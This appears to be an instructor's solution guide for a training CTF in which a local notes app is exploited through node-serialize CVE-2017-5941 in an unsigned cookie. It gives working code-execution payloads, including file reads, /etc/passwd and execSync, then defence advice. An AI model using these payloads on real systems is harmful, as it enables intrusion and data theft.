To regenerate:


## Flag Location

Each user has one flag, stored in two places:
- `src/data/flags.json` -- username to flag string mapping
- `src/data/flag-files/<username>.txt` -- the file the exploit payload reads

Flag format: `durham-ds{<16-hex-token>_<username>}`

Example: `durham-ds{f060f787d6634bec_abcd12}`

---

## Vulnerability Summary

The application uses `node-serialize@0.0.4` to parse the `profile` cookie on every request. This package is abandoned and contains CVE-2017-5941: it calls `eval()` on any string value prefixed with `_$$ND_FUNC$$_`. If that string ends with `()`, it is an Immediately Invoked Function Expression (IIFE) and executes immediately during deserialization. Since the cookie is unsigned and `httpOnly: false`, a player can replace it with a crafted payload and achieve arbitrary code execution on the server.

The `/home` route renders `req.userProfile.username` into the page. When the IIFE's return value replaces the username field, the flag appears in the page body.

## Full Exploit Walkthrough

### Step 1: Start the application

```bash
cd CTFs/CTF_7_notes_app
docker compose up --build
```

Application is available at `http://localhost:3001`.

---

### Step 2: Log in

1. Go to `http://localhost:3001/`
2. Enter a username and password from `src/data/users.json`. For example: `abcd12`.
3. You are redirected to `http://localhost:3001/home`, which shows a notes dashboard.

---

### Step 3: Inspect the profile cookie

Open DevTools (F12), go to **Application > Cookies > http://localhost:3001** (Chrome) or **Storage > Cookies**. Find the cookie named `profile`.

Decode its value in the browser console:

```js
atob(document.cookie.split('profile=')[1])
```

You will see something like:

```json
{"username":"abcd12","theme":"light","lastVisit":"2026-04-16T12:00:00.000Z"}
```

This is plain JSON, Base64-encoded with no signature. The server trusts it entirely.

---

### Step 4: Discover the vulnerable library

Any one of the following three paths leads to the same conclusion.

**Path A -- HTML comment in page source:**

Right-click the login page or the home dashboard, view source. Find:

```html
<!-- legacy profile format: handled by node-serialize, see /package.json -->
```

**Path B -- /debug endpoint:**

Click the "Changelog" or "Internal Tools" link in the page footer, or navigate directly to `http://localhost:3001/debug`. The JSON response contains:

```json
{
  "note": "Debug endpoint. Shows your parsed profile cookie.",
  "profile": { "username": "abcd12", ... },
  "_engine": "node-serialize@0.0.4",
  "_engineNote": "Profile data is deserialized server-side on every page load using this engine.",
  "_appRoot": "/app"
}
```

The `_appRoot` field gives the container's working directory (`/app`). A player can use this in two ways:

**Option 1: Enumerate with a test payload first.**
Before reading the flag file, use the RCE to list the directory and confirm the path exists. Craft a cookie with:

```json
{
  "username": "_$$ND_FUNC$$_function(){return require('fs').readdirSync('/app/src/data/flag-files').join(', ')}()"
}
```

Visit `/home`. The page renders the contents of `flag-files/` (e.g. `abcd12.txt, efgh34.txt, ijkl56.txt`), confirming the path and the exact filename before committing to the full read payload.

**Option 2: Reason from the debug output.**
The `/debug` response shows the parsed profile object under `profile`. That object came from `node-serialize`, which the app loaded. The app is Node.js, so the conventional layout is `src/data/` inside the project root. `_appRoot` is `/app`, so data files are at `/app/src/data/`. The flag files were named after the username (visible from the enumeration step, or guessable since the username is already known from the profile cookie).

Visit it 2 or more times and a hint field appears:

```json
"_hint": "CVE-2017-5941: functions embedded in serialized data are reconstructed and immediately executed on deserialization. See https://www.npmjs.com/package/node-serialize"
```

**Path B2 -- /CHANGELOG.md:**

Click the "Changelog" link in the page footer, or navigate to `http://localhost:3001/CHANGELOG.md`. The file contains:

```
[INFRA] Profile cookie uses node-serialize for session data persistence.
        Supports complex data types including JavaScript functions.
        See /package.json for the pinned version.
```

This names the library, confirms it handles functions, and points to `/package.json`.

**Path C -- Exposed package.json:**

Navigate to `http://localhost:3001/package.json`. The file is served as a static asset and lists:

```json
"node-serialize": "0.0.4"
```

---

### Step 5: Understand the CVE

Search for `node-serialize CVE-2017-5941` or read the npm page at https://www.npmjs.com/package/node-serialize.

The key behaviour: during `unserialize()`, if any string property value starts with `_$$ND_FUNC$$_`, the rest of the string is passed to `eval()`. If the string ends with `()`, the function is invoked immediately (IIFE) and its return value is used as the property value.

Example: this JSON, when deserialized, executes `require('fs').readFileSync(...)` and puts the result into the `username` field:

```json
{
  "username": "_$$ND_FUNC$$_function(){ return require('fs').readFileSync('/etc/hostname','utf8') }()"
}
```

---

### Step 6: Build the exploit payload

#### 6a: Confirm the flag file path (recommended)

Use the RCE to list the directory before reading from it. This removes any guesswork about the path.

In the browser console:

```js
document.cookie = "profile=" + btoa(JSON.stringify({
  username: "_$$ND_FUNC$$_function(){return require('fs').readdirSync('/app/src/data/flag-files').join(', ')}()",
  theme: "light",
  lastVisit: new Date().toISOString()
}));
```

Navigate to `/home`. The page renders something like: `Welcome back, abcd12.txt, efgh34.txt, ijkl56.txt`

This confirms the directory exists and shows the exact filename for your user. The full path is `/app/src/data/flag-files/<username>.txt`.

#### 6b: Read the flag

**In the browser console, run this to generate the forged cookie value:**

```js
btoa(JSON.stringify({
  username: "_$$ND_FUNC$$_function(){return require('fs').readFileSync('/app/src/data/flag-files/abcd12.txt','utf8').trim()}()",
  theme: "light",
  lastVisit: new Date().toISOString()
}))
```

Copy the output string. It will look like a long Base64 string.

**Alternatively, run this in a terminal with Node.js:**

```js
const payload = {
  username: "_$$ND_FUNC$$_function(){return require('fs').readFileSync('/app/src/data/flag-files/abcd12.txt','utf8').trim()}()",
  theme: "light",
  lastVisit: new Date().toISOString()
};
console.log(Buffer.from(JSON.stringify(payload)).toString('base64'));
```

---

### Step 7: Replace the cookie

In DevTools, go to **Application > Cookies > http://localhost:3001**. Double-click the `profile` cookie value, paste your Base64 payload string, and press Enter.

Or use the browser console to set it directly:

```js
document.cookie = "profile=" + btoa(JSON.stringify({
  username: "_$$ND_FUNC$$_function(){return require('fs').readFileSync('/app/src/data/flag-files/abcd12.txt','utf8').trim()}()",
  theme: "light",
  lastVisit: new Date().toISOString()
}));
```

---

### Step 8: Retrieve the flag

Navigate to `http://localhost:3001/home`.

The page renders: **"Welcome back, durham-ds{f060f787d6634bec_abcd12}"**

The flag appears where the username normally would, because the IIFE's return value replaced the `username` field during deserialization.

**Flag:** `durham-ds{<token>_<username>}` (per-user, see `src/data/flags.json`)

## One-liner via curl

For quick instructor verification without a browser:

```bash
# Step 1: Login and capture the session cookie
COOKIE=$(curl -s -c - -X POST http://localhost:3001/login \
  -d "username=abcd12&password=<password_from_users.json>" \
  | grep profile | awk '{print $7}')

# Step 2: Build the exploit payload
PAYLOAD=$(node -e "
const p = {
  username: \"_\\\$\\\$ND_FUNC\\\$\\\$_function(){return require('fs').readFileSync('/app/src/data/flag-files/abcd12.txt','utf8').trim()}()\",
  theme: 'light',
  lastVisit: new Date().toISOString()
};
console.log(Buffer.from(JSON.stringify(p)).toString('base64'));
")

# Step 3: Send the exploit cookie and retrieve the flag
curl -s -H "Cookie: profile=$PAYLOAD" http://localhost:3001/home | grep -o 'durham-ds{[^}]*}'
```

## Generalised RCE

The same technique can run any Node.js code. These payloads work identically:

**Read any file:**
```js
"_$$ND_FUNC$$_function(){return require('fs').readFileSync('/etc/passwd','utf8')}()"
```

**Run a shell command:**
```js
"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString().trim()}()"
```

Players who achieve RCE by any means and read their flag file should receive full credit.

---

## Unintended Solutions to Watch For

- **Reading another player's flag file:** The IIFE constructs the flag file path from the `username` field in the payload. A player could change the username in the payload to read another player's file. This is technically possible but acceptable for a basic-tier CTF. Verify that the flag matches the player's assigned username.
- **Visiting /flag:** Returns a red herring page with no flag. Not a solution path.
- **Brute forcing login:** Rate limited to 5 attempts per 2 minutes per IP.

---

## Defence Recommendations

1. **Replace node-serialize.** The package is unmaintained and unfixable. Use `JSON.parse()` for plain data, or a library that does not call `eval()`.
2. **Sign cookies.** Use Express's built-in signed cookie support (`res.cookie('profile', value, { signed: true })`). A tampered cookie will fail signature verification and be rejected.
3. **Set httpOnly: true.** Prevents JavaScript from reading the cookie in the browser, reducing the attack surface for XSS-based theft.
4. **Never call eval() on user-controlled input.** This is the root cause. Any library that evaluates arbitrary strings from untrusted sources should be treated as unsafe.
5. **Run npm audit regularly.** CVE-2017-5941 has been in public databases since 2017. Routine dependency auditing would have flagged this immediately.
6. **Retire abandoned software.** Applications with no active maintainer accumulate unpatched vulnerabilities over time.

## OWASP Classification

| Technique | OWASP Category | Justification |
|-----------|----------------|---------------|
| Insecure deserialization via `eval()` in `node-serialize` | A08:2021 Software and Data Integrity Failures | Untrusted cookie data is deserialized without integrity verification, leading to RCE |
| Known-vulnerable npm package (CVE-2017-5941) | A06:2021 Vulnerable and Outdated Components | Application depends on an abandoned package with a published critical CVE |
| Unsigned, unencrypted session cookie | A02:2021 Cryptographic Failures | Session data lacks signing or encryption, enabling trivial tampering |
